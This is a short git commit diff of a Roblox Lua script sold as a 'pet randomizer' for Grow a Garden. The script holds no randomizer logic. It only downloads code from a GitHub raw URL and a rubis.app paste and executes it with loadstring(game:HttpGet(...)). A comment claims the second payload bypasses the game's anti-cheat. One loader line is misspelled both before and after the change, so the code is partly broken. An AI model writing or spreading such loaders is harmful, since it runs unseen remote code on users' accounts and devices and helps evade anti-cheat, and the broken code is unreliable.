7d75a161d1f85e3cbd2d0e1f6197aa4cbaf942be
Roblox Scripts <gregyheport@gmail.com>
2025-08-04 09:49:44 +0800

    Update Randomizer-Pets-Working-GrowAGarden.lua

--- Randomizer-Pets-Working-GrowAGarden.lua
+++ Randomizer-Pets-Working-GrowAGarden.lua
@@ -1,4 +1,5 @@
-loadstding(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/anti"))()
+loadstsing(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/anti"))()
 task.wait(1)
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/WAxJ8MoGbKixWsnR/raw", true))()
+
 -- Dont Remove the second script it bypass the anti cheat if you remove it theres a chance you will get banned
